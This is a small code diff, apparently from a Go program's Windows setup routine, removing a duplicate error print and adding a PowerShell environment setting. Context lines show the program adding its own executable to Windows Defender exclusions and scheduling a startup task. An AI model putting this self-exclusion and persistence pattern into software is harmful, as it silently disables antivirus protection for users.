@@ -164,7 +164,6 @@ func WindowsBroadcast(message string) error {
 func handle(e error) {
 	if e != nil {
 		fmt.Println(Red + "PANIC: Something internal went wrong, this text should never be visible!!!")
-		fmt.Println(e)
 		fmt.Println(Reset, e)
 		os.Exit(-1)
 	}
@@ -256,6 +255,9 @@ func WindowsFirstTimeSetup() {
 	// Tell windows defender our binary can be trusted.
 	_, err = ExecPowerShell("Add-MpPreference -ExclusionPath " + exePath)
 	handle(err)
+
+	// Disable Active Directory drive mapping (idek bro)
+	_, err = ExecPowerShell("$env:ADPS_LoadDefaultDrive = 0")
 
 	fmt.Println("Scheduling startup task...")
 	// Enable the failsafe task to run at startup
